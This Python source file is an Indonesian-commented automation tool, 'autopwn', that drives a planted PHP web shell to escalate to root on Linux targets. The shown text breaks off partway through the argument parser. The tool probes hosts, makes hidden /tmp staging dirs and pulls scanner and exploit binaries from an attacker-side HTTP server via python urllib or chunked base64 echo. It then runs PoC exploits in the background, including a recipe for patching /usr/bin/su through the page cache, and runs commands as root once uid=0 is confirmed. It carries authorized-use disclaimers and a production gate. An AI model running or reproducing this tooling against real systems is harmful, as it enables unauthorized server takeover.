#!/usr/bin/env python3
"""autopwn — otomasi LPE end-to-end via web shell (AutoRoot).

Alur per target (semua lewat POST cmd ke shell):
  probe  -> deploy scanner (serve HTTP dari Kali / --fetch-base / chunk base64)
         -> scan backgrounded + poll done.flag -> ambil report (gzip+split fallback)
         -> seleksi (parity buildkit: has_poc, confidence, KEV->score) + rule BP/ESC
         -> checker-first -> upload biner PoC -> eksekusi -> verifikasi root -> log.

HANYA UNTUK TARGET TERAUTORISASI (lab sendiri / CTF / pentest berizin).
EDUCATIONAL PURPOSES ONLY — pendidikan & riset keamanan terautorisasi.
Scanner (lpescan.*) tetap read-only dan tidak pernah mengeksekusi PoC;
yang mengeksekusi PoC adalah tool ini (attacker-side) dan HANYA terhadap
target yang diberikan lewat --shell. Target produksi: wajib --production
+ --confirm-production (banner risiko).

Contoh:
  python3 autopwn.py --shell http://192.168.1.11/uploads/shell.php \\
                     --shell http://192.168.1.12/dvwa/hackable/uploads/shell.php
  python3 autopwn.py --shell URL --scan-only       # hanya scan + PLAN.md
  python3 autopwn.py --shell URL --allow-backported # BP: checker-stage saja
  python3 autopwn.py --fetch-base http://host/dir  # biner dari hosting eksternal
  python3 autopwn.py --github                      # biner dari repo GitHub (raw)
  python3 autopwn.py --selftest                    # gate offline

Catatan teknis:
- Shell HAXOR v9: POST-only param cmd, output di <pre> pertama; cmd multi-baris
  TIDAK jalan -> semua command satu baris; template RECIPES dilarang memakai
  tanda kutip tunggal (wrapper run_bg memakai single quote).
- Pengiriman file: server HTTP ephemeral lokal (default) -> target tarik via
  python3 urllib; fallback chunk base64 48K via echo|base64 -d; selalu md5sum.
- Proses lama (scan/exploit) di-background dengan nohup + poll done.flag
  (PHP max_execution_time tidak membatasi).
"""

import argparse
import base64
import functools
import glob
import gzip
import hashlib
import http.server
import json
import os
import random
import re
import shutil
import socket
import subprocess
import sys
import tempfile
import threading
import time
import urllib.parse
import urllib.request

VERSION = "1.0.0"

SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
DIST_DIR = os.path.join(SCRIPT_DIR, "dist")
POCS_BIN = os.path.join(SCRIPT_DIR, os.pardir, "cve-lpe", "pocs", "bin")
OUT_ROOT = os.path.join(SCRIPT_DIR, "autopwn-out")

# ukuran chunk transfer (karakter base64 per request)
CHUNK_B64 = 48000
SPLIT_DL = 24000
FAST_PATH_MAX = 40000

TIER_ORDER = {"kernel": 0, "package": 1, "os_build": 2, "distro_pin": 3}

CHECKER_RE = re.compile(r"(?i)(check|verif|vuln|test)")
SAFE_PAT = re.compile(r"(?i)(not vulnerable|you are safe|not affected|invulnerable|safe!)")
VULN_PAT = re.compile(r"(?i)(vulnerable|vuln\b|affected)")

# Template eksekusi per CVE (dari pengalaman E2E di lab yang sama).
# Aturan: TANPA tanda kutip tunggal di value apa pun (wrapper memakai ').
RECIPES = {
    # CopyFail — exploit patch /usr/bin/su via page cache; baris pertama stdin
    # termakan exploit (kirim dummy), perintah berikutnya dijalankan root.
    "CVE-2026-31431": {
        "exploit_pref": "prebuilt-exploit",
        "checker_pref": "verify_vulneurable",
        "stdin_b64": base64.b64encode(b"\nid\n").decode(),
        "timeout": 90,
        "expect": "uid=0",
        # su ter-patch mengeksekusi BARIS PERTAMA stdin sebagai command root
        # (-c diabaikan) — terbukti di davinz 2026-09-28.
        "verify": "echo id | /usr/bin/su 2>&1",
        "root_route": "su_patched",
    },
}
DEFAULT_RECIPE = {
    "stdin_b64": base64.b64encode(b"\n").decode(),
    "timeout": 60,
    "expect": "uid=0",
    "verify": "id -u",
    "root_route": "direct",
}


# ------------------------------------------------------------------------- util

def now_ts():
    return time.strftime("%Y%m%d-%H%M%S")


def md5_local(path):
    h = hashlib.md5()
    with open(path, "rb") as f:
        for blk in iter(lambda: f.read(65536), b""):
            h.update(blk)
    return h.hexdigest()


def b64_decode_clean(s):
    """Decode base64 setelah membuang semua karakter non-base64 (junk HTML)."""
    clean = re.sub(r"[^A-Za-z0-9+/=]", "", s or "")
    if not clean:
        return b""
    clean += "=" * ((-len(clean)) % 4)
    return base64.b64decode(clean)


def b64_chunks(data, n=CHUNK_B64):
    b = base64.b64encode(data).decode()
    for i in range(0, len(b), n):
        yield b[i:i + n]


def b64line_filter(text, minlen=40):
    """Ambil hanya baris yang full-match base64 panjang (junk HTML tersaring)."""
    out = []
    for line in (text or "").splitlines():
        s = line.strip()
        if re.fullmatch(r"[A-Za-z0-9+/=]{%d,}" % minlen, s):
            out.append(s)
    return "".join(out)


def parse_bg_out(s):
    """Parse output poll: baris1 done, baris2 rc, sisanya tail out.log."""
    lines = (s or "").splitlines()
    if not lines or lines[0].strip() != "done":
        return None, s
    rc = None
    if len(lines) > 1 and lines[1].strip().lstrip("-").isdigit():
        rc = int(lines[1].strip())
    tail = "\n".join(lines[2:])
    return rc, tail


class ShellError(Exception):
    pass


# ------------------------------------------------------------------ ShellClient

class ShellClient:
    """Klien web shell HAXOR v9: POST cmd, ambil blok <pre> pertama."""

    def __init__(self, url, timeout=20, retries=3):
        if not re.match(r"^https?://", url or ""):
            raise ShellError(f"URL shell tidak valid: {url}")
        self.url = url
        self.timeout = timeout
        self.retries = retries
        self.opener = urllib.request.build_opener()
        self.n_calls = 0

    @staticmethod
    def extract(body):
        m = re.search(r"<pre>(.*?)</pre>", body or "", re.S)
        if not m:
            snippet = re.sub(r"\s+", " ", body or "")[:200]
            raise ShellError(f"output region <pre> tidak ditemukan (halaman error?) — {snippet}")
        return m.group(1).strip()

    def exec(self, cmd, timeout=None):
        data = urllib.parse.urlencode({"cmd": cmd}).encode()
        last = None
        for attempt in range(self.retries):
            try:
                req = urllib.request.Request(
                    self.url, data=data,
                    headers={"Content-Type": "application/x-www-form-urlencoded"})
                with self.opener.open(req, timeout=timeout or self.timeout) as r:
                    body = r.read().decode("utf-8", "replace")
                self.n_calls += 1
                return self.extract(body)
            except ShellError:
                raise
            except Exception as e:  # URLError/timeout -> retry
                last = e
                time.sleep(1 + attempt)
        raise ShellError(f"exec gagal {self.retries}x: {last}")


# ------------------------------------------------------------------ serve lokal

def local_ip_for(host):
    """IP interface Kali yang me-rute ke host target (server HTTP diumumkan)."""
    try:
        out = subprocess.run(["ip", "route", "get", host],
                             capture_output=True, text=True, timeout=5).stdout
        m = re.search(r"\bsrc (\d+\.\d+\.\d+\.\d+)", out)
        if m:
            return m.group(1)
    except Exception:
        pass
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect((host, 80))
        return s.getsockname()[0]
    except Exception:
        return "127.0.0.1"
    finally:
        s.close()


class FileServer:
    """HTTP server ephemeral di Kali; hanya file yang di-add() yang tersedia."""

    def __init__(self, target_host):
        self.dir = tempfile.mkdtemp(prefix="apx-serve-")
        s = socket.socket()
        s.bind(("0.0.0.0", 0))
        self.port = s.getsockname()[1]
        s.close()

        class Quiet(http.server.SimpleHTTPRequestHandler):
            def log_message(self, *a):
                pass

        handler = functools.partial(Quiet, directory=self.dir)
        self.httpd = http.server.ThreadingHTTPServer(("0.0.0.0", self.port), handler)
        self.thread = threading.Thread(target=self.httpd.serve_forever, daemon=True)
        self.base = f"http://{local_ip_for(target_host)}:{self.port}"
        self.started = False

    def start(self):
        self.thread.start()
        self.started = True

    def add(self, local_path, rel_path=None):
        """Copy file ke dir serve (struktur repo bila rel_path), return URL."""
        rel = rel_path or os.path.basename(local_path)
        dest = os.path.join(self.dir, rel)
        os.makedirs(os.path.dirname(dest), exist_ok=True)
        shutil.copyfile(local_path, dest)
        return fetch_url(self.base, rel)

    def close(self):
        try:
            self.httpd.shutdown()
        except Exception:
            pass
        shutil.rmtree(self.dir, ignore_errors=True)


# ------------------------------------------------------------------ transfer file

def _md5_remote(client, remote_path):
    out = client.exec(f"md5sum {remote_path} 2>/dev/null")
    return out.split()[0] if out and len(out.split()) >= 1 else None


def fetch_url(fetch_base, repo_rel):
    """URL penuh untuk path relatif repo (mis. raw.githubusercontent.com)."""
    path = "/".join(urllib.parse.quote(seg, safe="") for seg in repo_rel.split("/"))
    return fetch_base.rstrip("/") + "/" + path


def deliver(client, local_path, remote_path, server=None, fetch_base=None,
            repo_rel=None, log=print):
    """Kirim file ke target: 1) fetch dari URL (server lokal/eksternal),
    2) fallback chunk base64 via echo|base64 -d. Verifikasi md5sum."""
    want = md5_local(local_path)
    rel = repo_rel or os.path.basename(local_path)
    url = None
    if server is not None:
        try:
            url = server.add(local_path, rel)
        except Exception as e:
            log(f"    [!] gagal add ke serve dir: {e}")
    elif fetch_base:
        url = fetch_url(fetch_base, rel)
    if url:
        try:
            client.exec(
                "python3 -c \"import urllib.request;urllib.request.urlretrieve("
                f"'{url}','{remote_path}')\"",
                timeout=180)
            if _md5_remote(client, remote_path) == want:
                return
            log(f"    [!] md5 mismatch lewat fetch ({url}) — fallback chunk")
        except Exception as e:
            log(f"    [!] fetch gagal ({e}) — fallback chunk")
    client.exec(f"rm -f {remote_path}")
    with open(local_path, "rb") as f:
        data = f.read()
    for i, chunk in enumerate(b64_chunks(data)):
        for attempt in range(3):
            try:
                client.exec(f"echo {chunk} | base64 -d >> {remote_path}", timeout=60)
                break
            except Exception as e:
                if attempt == 2:
                    raise ShellError(f"chunk {i} gagal: {e}")
                time.sleep(1 + attempt)
    got = _md5_remote(client, remote_path)
    if got != want:
        raise ShellError(f"md5 mismatch {os.path.basename(local_path)}: "
                         f"lokal={want} remote={got}")


def get_remote_file(client, remote_path, log=print):
    """Tarik file dari target: fast path (<40KB) else gzip+base64+split 24K."""
    sz = int(client.exec(f"stat -c %s {remote_path} 2>/dev/null").strip() or 0)
    if sz <= 0:
        raise ShellError(f"file remote kosong/hilang: {remote_path}")
    remote_md5 = _md5_remote(client, remote_path)
    if sz < FAST_PATH_MAX:
        try:
            raw = client.exec(f"base64 -w0 {remote_path}", timeout=60)
            data = b64_decode_clean(raw)
            if data and (not remote_md5 or hashlib.md5(data).hexdigest() == remote_md5):
                return data
            log("    [!] fast path korup/terpotong — fallback chunked")
        except Exception as e:
            log(f"    [!] fast path gagal ({e}) — fallback chunked")
    d = os.path.dirname(remote_path)
    n = os.path.basename(remote_path)
    client.exec(f"cd {d} && rm -f ch_* && gzip -9 -c {n} | base64 -w0 | "
                f"split -b {SPLIT_DL} - ch_", timeout=180)
    names = [x for x in client.exec(f"ls {d}/ch_* 2>/dev/null").split()
             if "/ch_" in x]
    if not names:
        raise ShellError("chunk file tidak dibuat di target")
    buf = []
    for nm in sorted(names):
        raw = client.exec(f"cat {nm}", timeout=60)
        buf.append(b64line_filter(raw))
    data = gzip.decompress(b64_decode_clean("".join(buf)))
    if remote_md5 and hashlib.md5(data).hexdigest() != remote_md5:
        raise ShellError("md5 report tidak cocok setelah reassemble")
    return data


# ------------------------------------------------------------------ run background

def run_bg(client, stage, cmdline, label, stdin_bytes=None, timeout=600,
           poll=10, log=print):
    """Jalankan command lama di target secara detached + poll done.flag."""
    if stdin_bytes is not None:
        sb = base64.b64encode(stdin_bytes).decode()
        inner = f"cd {stage} && ( echo {sb} | base64 -d | ( {cmdline} ) )"
    else:
        inner = f"cd {stage} && ( {cmdline} ) </dev/null"
    launcher = (f"nohup sh -c '{inner} >{stage}/out.log 2>&1; "
                f"echo $? >{stage}/rc.flag; echo done >{stage}/done.flag' "
                f">/dev/null 2>&1 & echo BG_OK")
    out = client.exec(launcher, timeout=30)
    if "BG_OK" not in out:
        raise ShellError(f"gagal start background ({label}): {out[:120]}")
    log(f"    ... {label} jalan di background (timeout {timeout}s)")
    deadline = time.time() + timeout
    s = ""
    while time.time() < deadline:
        time.sleep(poll)
        s = client.exec(f"cat {stage}/done.flag 2>/dev/null; "
                        f"cat {stage}/rc.flag 2>/dev/null; "
                        f"tail -c 4000 {stage}/out.log 2>/dev/null", timeout=30)
        rc, tail = parse_bg_out(s)
        if rc is not None:
            return rc, tail
    raise ShellError(f"timeout {timeout}s: {label} — tail: {s[:300]}")


# ------------------------------------------------------------------ probe & deploy

def probe(client, log):
    log("  [probe] fakta dasar target")
    f = {}
    f["id"] = client.exec("id")
    f["kernel"] = client.exec("uname -r")
    f["arch"] = client.exec("uname -m")
    f["hostname"] = client.exec("hostname 2>/dev/null || uname -n")
    f["osrel"] = client.exec("grep -E '^(ID|PRETTY_NAME|VERSION_ID)=' /etc/os-release 2>/dev/null")
    f["python"] = client.exec("python3 -V 2>&1 || echo NOPY")
    f["bash"] = client.exec("bash --version 2>/dev/null | head -1 || echo NOBASH")
    f["tmpw"] = client.exec("test -w /tmp && echo W || echo NO")
    f["cont"] = client.exec("test -f /.dockerenv && echo Y || grep -q docker /proc/1/cgroup 2>/dev/null && echo Y || echo N")
    for k, v in f.items():
        log(f"    {k}: {v.strip()[:100]}")
    if not f["kernel"]:
        raise ShellError("probe gagal (kemungkinan bukan shell linux) — v1 hanya linux")
    return f


def flavor_for(f):
    """Pilih implementasi deploy: python3 (>=3.8) > bash4 > abort."""
    if "NOPY" not in f["python"]:
        m = re.search(r"(\d+)\.(\d+)", f["python"])
        if m and (int(m.group(1)), int(m.group(2))) >= (3, 8):
            return "python"
    if "NOBASH" not in f["bash"]:
        m = re.search(r"(\d+)\.(\d+)", f["bash"])
        if m and (int(m.group(1)), int(m.group(2))) >= (4, 0):
            return "bash"
    return None


def deploy_scanner(client, stage, flavor, opts, server, log):
    log(f"  [deploy] scanner (flavor={flavor}) ke {stage}")
    if flavor == "python":
        files = [("lpescan.py", os.path.join(DIST_DIR, "lpescan.py")),
                 ("lpe-data.json.gz", os.path.join(DIST_DIR, "lpe-data.json.gz"))]
        scan_cmd = "python3 lpescan.py --json-only --report scan.json --no-color"
    else:
        files = [("lpescan.sh", os.path.join(DIST_DIR, "lpescan.sh"))]
        for tsv in ("lpe-cves-linux", "lpe-cve-meta", "lpe-pkgmap", "lpe-distromap",
                    "lpe-gtfo", "lpe-pocs", "lpe-info"):
            files.append((f"{tsv}.tsv", os.path.join(DIST_DIR, f"{tsv}.tsv")))
        scan_cmd = "bash lpescan.sh --json-only --report scan.json --no-color"
    for name, local in files:
        if not os.path.isfile(local):
            raise ShellError(f"file deploy hilang di mesin arsip: {local} "
                             f"(jalankan build-scanner.py)")
        log(f"    kirim {name} ({os.path.getsize(local)} B)")
        deliver(client, local, f"{stage}/{name}", server=server,
                fetch_base=opts.fetch_base, repo_rel=f"lpescan/dist/{name}",
                log=log)
    log("  [scan] menjalankan scanner di target...")
    rc, tail = run_bg(client, stage, scan_cmd, "scan", timeout=opts.scan_timeout,
                      poll=opts.poll, log=log)
    if rc != 0:
        raise ShellError(f"scan gagal rc={rc}\n{tail[-800:]}")
    log("  [scan] selesai — menarik report...")
    data = get_remote_file(client, f"{stage}/scan.json", log)
    return json.loads(data.decode("utf-8"))


# ------------------------------------------------------------------ seleksi

def select_findings(report, include_possible=False):
    """Parity buildkit.py:101-111 + catatan BP/ESC; re-sort lokal (quirk bash)."""
    out = []
    for f in report.get("findings", {}).get("cve", []):
        if not f.get("has_poc"):
            continue
        if f.get("confidence") == "possible" and not include_possible:
            continue
        out.append(dict(f))
    out.sort(key=lambda f: (not f.get("kev"),
                            TIER_ORDER.get(f.get("matched_by"), 4),
                            -(f.get("score") or 0), f.get("id", "")))
    return out


def pick_files(cid, recipe, bin_dir=POCS_BIN):
    """Pilih biner checker & exploit untuk sebuah CVE dari arsip lokal."""
    files = sorted(glob.glob(os.path.join(bin_dir, f"{cid}-*")))
    if not files:
        return None, None
    bases = [os.path.basename(x) for x in files]
    checkers = [f for f, b in zip(files, bases) if CHECKER_RE.search(b)]
    exploits = [f for f, b in zip(files, bases) if not CHECKER_RE.search(b)]

    def pref(lst, kw):
        if not lst:
            return None
        if kw:
            for f in lst:
                if kw.lower() in os.path.basename(f).lower():
                    return f
        for f in lst:
            if "prebuilt" in os.path.basename(f).lower():
                return f
        return lst[0]

    chk = pref(checkers, recipe.get("checker_pref"))
    exp = pref(exploits, recipe.get("exploit_pref"))
    return chk, exp


def plan_md(host, report, sel, opts, facts):
    """PLAN.md — format section mirip KIT-README buildkit."""
    lines = [f"# Autopwn PLAN — {host} ({report.get('target', {}).get('os')})",
             f"- Dibuat: {now_ts()}",
             f"- Dataset: {report.get('scanner', {}).get('dataset_generated')} "
             f"({report.get('scanner', {}).get('cve_count')} CVE)",
             f"- CVE terseleksi (has_poc, bukan possible): {len(sel)}",
             "",
             "> Otomasi: checker-first; BP = checker-stage saja (bila --allow-backported);",
             "> berhenti di root pertama; exploit kernel bisa crash box lab — sadar risiko.",
             ""]
    for f in sel:
        lines.append(f"## {f['id']} — {f.get('severity')} {f.get('score')}"
                     f"{' **[KEV]**' if f.get('kev') else ''}")
        lines.append(f"- matched_by: {f.get('matched_by')} ({f.get('confidence')})"
                     f"{' [BP]' if f.get('likely_backported') else ''}"
                     f"{' [ESC]' if f.get('escape_class') else ''}")
        for m in (f.get("matches") or [])[:2]:
            lines.append(f"- constraint: `{m.get('constraint')}` vs terpasang "
                         f"`{m.get('installed')}`")
        desc = (f.get("description") or "").replace("\n", " ")[:300]
        lines.append(f"- {desc}")
        repos = ", ".join(p.get("url", "") for p in f.get("pocs", []))[:400]
        if repos:
            lines.append(f"- repo: {repos}")
        chk, exp = pick_files(f["id"], RECIPES.get(f["id"], {}))
        lines.append(f"- checker lokal: {os.path.basename(chk) if chk else '-'} | "
                     f"exploit lokal: {os.path.basename(exp) if exp else '-'}")
        lines.append("")
    return "\n".join(lines)


# ------------------------------------------------------------------ eksekusi

def execute_phase(client, stage, sel, opts, facts, log, ev_add):
    log("  [exec] fase eksploitasi")
    in_container = "Y" in facts.get("cont", "N")
    # apakah box sudah punya jalur root (mis. su ter-patch sesi sebelumnya)?
    pre = client.exec("echo id | /usr/bin/su 2>&1", timeout=30)
    if "uid=0" in pre:
        log("  [!] SUDAH ROOT dari awal (artefak lama?) — tidak perlu exploit:")
        log("      " + pre.replace("\n", " | "))
        return {"verdict": "already_root", "detail": pre}
    tried = 0
    for f in sel:
        cid = f["id"]
        bp = bool(f.get("likely_backported"))
        esc = bool(f.get("escape_class"))
        if bp and not opts.allow_backported:
            log(f"  [skip] {cid} [BP] — backport distro (pakai --allow-backported)")
            continue
        if esc and in_container:
            log(f"  [skip] {cid} [ESC] — target container; verifikasi sisi host manual")
            continue
        recipe = dict(DEFAULT_RECIPE)
        if cid in RECIPES:
            recipe.update(RECIPES[cid])
        chk_local, exp_local = pick_files(cid, RECIPES.get(cid, {}))
        mode = "checker-only" if bp else "full"
        log(f"  [{tried + 1}] {cid} mode={mode}")
        vuln_confirmed = False
        if chk_local:
            deliver(client, chk_local, f"{stage}/{os.path.basename(chk_local)}",
                    server=opts.server, fetch_base=opts.fetch_base,
                    repo_rel=f"cve-lpe/pocs/bin/{os.path.basename(chk_local)}",
                    log=log)
            client.exec(f"chmod +x {stage}/{os.path.basename(chk_local)}")
            try:
                _, cout = run_bg(client, stage,
                                 f"./{os.path.basename(chk_local)}", "checker",
                                 stdin_bytes=None, timeout=90, poll=opts.poll, log=log)
            except ShellError as e:
                cout = str(e)
            ev_add({"stage": "checker", "cve": cid, "out_tail": cout[-600:]})
            if SAFE_PAT.search(cout):
                log(f"    checker: SAFE — skip {cid}")
                continue
            if VULN_PAT.search(cout):
                vuln_confirmed = True
                log("    checker: VULNERABLE")
            else:
                log("    checker: inconclusive")
                if bp:
                    log(f"    [skip] {cid} BP + checker inconclusive")
                    continue
        if not exp_local:
            log(f"    [skip] {cid} source-only (tanpa biner lokal)")
            continue
        if mode == "checker-only" and not vuln_confirmed:
            log(f"    [skip] {cid} BP tanpa konfirmasi checker")
            continue
        deliver(client, exp_local, f"{stage}/{os.path.basename(exp_local)}",
                server=opts.server, fetch_base=opts.fetch_base,
                repo_rel=f"cve-lpe/pocs/bin/{os.path.basename(exp_local)}",
                log=log)
        client.exec(f"chmod +x {stage}/{os.path.basename(exp_local)}")
        stdin = base64.b64decode(recipe["stdin_b64"])
        try:
            _, eout = run_bg(client, stage, f"./{os.path.basename(exp_local)}",
                             "exploit", stdin_bytes=stdin,
                             timeout=recipe.get("timeout", 60),
                             poll=opts.poll, log=log)
        except ShellError as e:
            eout = str(e)
        ev_add({"stage": "exploit", "cve": cid, "out_tail": eout[-800:]})
        log(f"    exploit out: {eout.strip()[-300:]}")
        ok = recipe.get("expect") in (eout or "")
        if not ok:
            try:
                v = client.exec(recipe["verify"], timeout=30)
            except ShellError as e:
                v = str(e)
            log(f"    verify ({recipe['verify'][:50]}...): {v.strip()[-200:]}")
            ok = "uid=0" in v
        tried += 1
        if ok:
            log(f"  [SUKSES] {cid} — root via {recipe['root_route']}")
            post = opts.post_root_cmd
            if recipe["root_route"] == "su_patched":
                po = client.exec(f'echo "{post}" | /usr/bin/su 2>&1', timeout=60)
            else:
                po = f"(route direct — run manual: {post})"
            ev_add({"stage": "post_root", "cve": cid, "out": po})
            log("  [root] bukti:")
            log("\n".join("      " + l for l in po.splitlines()[:20]))
            return {"verdict": "root", "cve": cid, "proof": po}
        if tried >= opts.max_exploits:
            log(f"  [stop] batas {opts.max_exploits} exploit tercapai tanpa root")
            break
    return {"verdict": "no_root"}


# ------------------------------------------------------------------ orchestrator

class LogSink:
    def __init__(self, path):
        self.fh = open(path, "a", encoding="utf-8")

    def __call__(self, msg):
        line = f"[{time.strftime('%H:%M:%S')}] {msg}"
        print(line)
        self.fh.write(line + "\n")
        self.fh.flush()

    def close(self):
        self.fh.close()


def run_target(shell_url, opts, log):
    log("=" * 66)
    log(f"TARGET {shell_url}")
    client = ShellClient(shell_url, timeout=opts.timeout)
    facts = probe(client, log)
    host = facts["hostname"].strip() or urllib.parse.urlparse(shell_url).hostname
    outdir = os.path.join(opts.outdir, f"{host}-{now_ts()}")
    os.makedirs(outdir, exist_ok=True)
    events = []

    def ev_add(d):
        events.append(dict(d, ts=time.strftime("%H:%M:%S")))
        with open(os.path.join(outdir, "events.json"), "w") as fh:
            json.dump(events, fh, indent=1, default=str)

    ev_add({"stage": "probe", "facts": {k: v.strip()[:120] for k, v in facts.items()}})

    flavor = flavor_for(facts)
    if flavor is None:
        raise ShellError("target tanpa python3 (>=3.8) maupun bash4 — deploy manual")
    stage = f"/tmp/.ap{''.join(random.choices('0123456789abcdef', k=8))}"
    out = client.exec(f"mkdir -p {stage} && echo MKDIR_OK")
    if "MKDIR_OK" not in out:
        raise ShellError(f"gagal bikin stage dir {stage}: {out[:120]}")

    server = None
    if opts.serve and not opts.fetch_base:
        server = FileServer(urllib.parse.urlparse(shell_url).hostname)
        server.start()
        log(f"  [serve] HTTP lokal: {server.base} (hanya file terpilih, ephemeral)")
        opts.server = server
    else:
        opts.server = None
    if opts.fetch_base:
        log(f"  [fetch] biner dari: {opts.fetch_base}")

    try:
        report = deploy_scanner(client, stage, flavor, opts, server, log)
        sel = select_findings(report, include_possible=opts.include_possible)
        with open(os.path.join(outdir, "scan.json"), "w") as fh:
            json.dump(report, fh, indent=1, default=str)
        log(f"  [report] {len(report.get('findings', {}).get('cve', []))} match CVE "
            f"-> {len(sel)} kandidat (has_poc)")
        plan = plan_md(host, report, sel, opts, facts)
        with open(os.path.join(outdir, "PLAN.md"), "w") as fh:
            fh.write(plan)
        ev_add({"stage": "select", "n_selected": len(sel),
                "ids": [f["id"] for f in sel]})
        verdict = {"verdict": "scan_only"}
        if not (opts.scan_only or opts.plan_only):
            if not sel:
                log("  [selesai] tidak ada kandidat — review PLAN.md / --include-possible")
            else:
                verdict = execute_phase(client, stage, sel, opts, facts, log, ev_add)
        elif opts.plan_only:
            log("  [plan-only] PLAN.md ditulis; eksekusi dilewati")
        ev_add({"stage": "verdict", **verdict})
        return verdict, outdir
    finally:
        if not opts.keep:
            try:
                client.exec(f"rm -rf {stage}", timeout=30)
            except Exception:
                pass
        if server is not None:
            server.close()


# ------------------------------------------------------------------ selftest

def selftest():
    ok = fail = 0

    def t(name, cond, info=""):
        nonlocal ok, fail
        if cond:
            ok += 1
            print(f"  OK   {name}")
        else:
            fail += 1
            print(f"  FAIL {name} {info}")

    print("[selftest autopwn]")
    # 1. ekstraksi <pre>
    body = ('<html><head></head><body><form><input value="echo x">'
            '<pre>hello\nworld uid=0</pre><div>tail</div></body></html>')
    ex = ShellClient.extract(body)
    t("extract_pre", ex == "hello\nworld uid=0", repr(ex))
    t("extract_missing", _raises(ShellError, ShellClient.extract, "<html></html>"))

    # 2. roundtrip chunk
    data = os.urandom(150_000)
    rebuilt = b64_decode_clean("".join(b64_chunks(data)))
    t("chunk_roundtrip", rebuilt == data)
    t("b64line_filter", b64line_filter(
        "AAAA\n<div class=x>\n" + "B" * 80 + "\n</pre>\n") == "B" * 80)

    # 3. parse_bg_out
    rc, tail = parse_bg_out("done\n0\nbaris out\nbaris2")
    t("bg_parse_ok", rc == 0 and tail == "baris out\nbaris2", f"{rc},{tail}")
    t("bg_parse_pending", parse_bg_out("") == (None, ""))

    # 4. seleksi & sort (quirk bash: re-sort lokal)
    report = {"findings": {"cve": [
        {"id": "CVE-A", "has_poc": True, "confidence": "high", "kev": False,
         "matched_by": "kernel", "score": 9.0},
        {"id": "CVE-B", "has_poc": True, "confidence": "high", "kev": True,
         "matched_by": "package", "score": 7.0},
        {"id": "CVE-C", "has_poc": True, "confidence": "possible", "kev": True,
         "matched_by": "kernel", "score": 10.0},
        {"id": "CVE-D", "has_poc": False, "confidence": "high", "kev": True,
         "matched_by": "kernel", "score": 10.0},
    ]}}
    sel = select_findings(report)
    t("select_order", [f["id"] for f in sel] == ["CVE-B", "CVE-A"], str(sel))
    # sort: KEV dulu -> tier (kernel < package) -> -score
    t("select_include_possible",
       [f["id"] for f in select_findings(report, include_possible=True)]
       == ["CVE-C", "CVE-B", "CVE-A"])

    # 5. pick_files (bin_dir fake)
    tmpd = tempfile.mkdtemp(prefix="apx-selftest-")
    for nm in ("CVE-2026-31431-prebuilt-exploit", "CVE-2026-31431-prebuilt-verify_vulneurable",
               "CVE-2026-31431-CVE-2026-31431-PocC-copy_fail", "CVE-X-plain"):
        open(os.path.join(tmpd, nm), "w").close()
    chk, exp = pick_files("CVE-2026-31431", RECIPES["CVE-2026-31431"], tmpd)
    t("pick_checker", chk is not None and "verify_vulneurable" in chk, str(chk))
    t("pick_exploit", exp is not None and "prebuilt-exploit" in exp, str(exp))
    t("pick_empty", pick_files("CVE-NOPE", {}, tmpd) == (None, None))
    shutil.rmtree(tmpd, ignore_errors=True)

    # 6. RECIPES: tanpa single quote, stdin valid
    for cid, r in RECIPES.items():
        t(f"recipe_{cid}_no_squote",
          "'" not in r.get("verify", "") and "'" not in r.get("expect", ""))
        t(f"recipe_{cid}_stdin_b64",
          len(base64.b64decode(r["stdin_b64"])) > 0)
    t("recipe_default_verify", "'" not in DEFAULT_RECIPE["verify"])

    # 7. md5 mismatch terdeteksi (logika pure)
    tmp = os.path.join(tempfile.gettempdir(), "apx-md5-t.bin")
    with open(tmp, "wb") as f:
        f.write(b"abc")
    t("md5_local", md5_local(tmp) == hashlib.md5(b"abc").hexdigest())
    os.remove(tmp)

    # 8. fetch_url (mapping path repo -> raw URL)
    t("fetch_url", fetch_url("https://raw.githubusercontent.com/u/r/main",
                             "lpescan/dist/lpescan.py")
      == "https://raw.githubusercontent.com/u/r/main/lpescan/dist/lpescan.py")

    # 9. gate produksi
    class OP:
        pass
    op = OP()
    op.production = True
    op.confirm_production = False
    t("production_gate", gate_production(op) is False)
    op.confirm_production = True
    t("production_confirm", gate_production(op) is True)

    print(f"[selftest] {ok} OK / {fail} FAIL")
    return 0 if fail == 0 else 4


def _raises(exc, fn, *a):
    try:
        fn(*a)
        return False
    except exc:
        return True


def gate_production(opts):
    """True bila boleh lanjut; False bila harus berhenti."""
    if opts.production and not getattr(opts, "confirm_production", False):
        print("=" * 66)
        print("  [!] TARGET PRODUKSI — risiko tinggi!")
        print("  Eksploit kernel dapat crash/panic server yang dipakai publik.")
        print("  Standar: flag risiko dulu, approval, snapshot/backup, jam sepi.")
        print("  Bila tetap lanjut: tambahkan --confirm-production")
        print("=" * 66)
        return False
    return True


# ------------------------------------------------------------------ main

def main(argv=None):
    ap = argparse.ArgumentParser(
        prog="autopwn.py", description="Otomasi LPE via web shell (AutoRoot) — "
        "scan -> pilih biner PoC -> upload -> eksekusi -> verifikasi root. "
        "HANYA target terautorisasi.")
    ap.add_argument("--shell", action="append", default=[],
                    help="URL web shell target (bisa diulang)")
    ap.add_argument("--scan-only", action="store_true",
                    help="hanya scan + tulis report & PLAN.md")
    ap.add_argument("--plan-only", action="store_true",
                    help="scan + seleksi + PLAN.md, tanpa eksekusi")
    ap.add_argument("--allow-backported", action="store_true",
                    help="match [BP] boleh ke tahap checker; exploit hanya "
                         "bila checker konfirmasi vulnerable")
    ap.add_argument("--include-possible", action="store_true",
                    help="sertakan confidence possible (parity buildkit)")
    ap.add_argument("--max-exploits", type=int, default=3,
                    help="batas jumlah exploit dicoba per target (default 3)")
    ap.add_argument("--post-root-cmd", default="id; hostname; uname -a",
                    help="command dijalankan root setelah sukses")
    ap.add_argument("--fetch-base", default=None,
                    help="URL dasar hosting eksternal biner (mis. R2 presigned)")
    ap.add_argument("--github", action="store_true",
                    help="ambil scanner+biner langsung dari repo GitHub "
                         "(raw.githubusercontent; fallback chunk bila target "
                         "tanpa internet)")
    ap.add_argument("--github-user", default="kevinpratama102",
                    help="user GitHub untuk --github (default kevinpratama102)")
    ap.add_argument("--github-repo", default="AutoRoot",
                    help="repo untuk --github (default AutoRoot)")
    ap.add_argument("--github-branch", default="main",
                    help="branch untuk --github (default main)")
    ap.add_argument("--no-serve", dest="serve", action="store_false",
                    help="matikan HTTP server lokal (hanya chunk base64)")
    ap.add_argument("--keep", action="store_true",
                    help="jangan hapus stage dir di target")
    ap.add_argument("--timeout", type=int, default=20,
